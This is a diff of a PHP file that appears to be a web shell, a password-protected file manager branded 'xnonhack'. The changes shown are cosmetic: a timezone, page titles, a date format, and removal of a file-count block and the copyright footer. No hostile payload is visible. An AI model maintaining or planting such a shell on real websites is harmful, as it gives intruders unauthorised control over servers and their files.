@@ -1,10 +1,13 @@
 <?php
+
+date_default_timezone_set("Asia/Jakarta");
 error_reporting(0);
 session_start();
 set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
 function login() {
 	?>
+	<title>Login</title>
 	<link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<style type="text/css">
@@ -1329,7 +1332,7 @@ function myFunction() {
 			} return $string;
 		}
     	public static function ftime($filename) {
-        	return date("F d Y g:i:s", filemtime($filename));
+        	 return date('l d M Y, H:i A', filemtime($filename));
     	}
     	public static function sortname($filename) {
     		if (strlen($filename) > 18) {
@@ -1900,6 +1903,7 @@ function myFunction() {
 						}
 					}
 					?>
+					<title>Edit</title>
 					<div class="edit">
 						<table width='100%' class="edit">
 							<tr>
@@ -2096,19 +2100,6 @@ function myFunction() {
 				?>
 			</table>
 		</div>
-		<div class="count">
-			<?php $folderCount = $fileCount = 0;
-				  x::countStuff('.', $fileCount, $folderCount); 
-			?>
-			Dir 	: 	<?= $folderCount ?>
-			File 	: 	<?= $fileCount ?>
-			Total 	: 	<?= x::total('.', 'all') ?>
-		</div>
-		</div>
-		</div>
 	</div>
 </div>
-<span style="color: #fff;">
-	<i class="fa fa-copyright" aria-hidden="true"></i>&nbsp; xnonhack - <?= date("Y") ?>
-</span>
 </center>
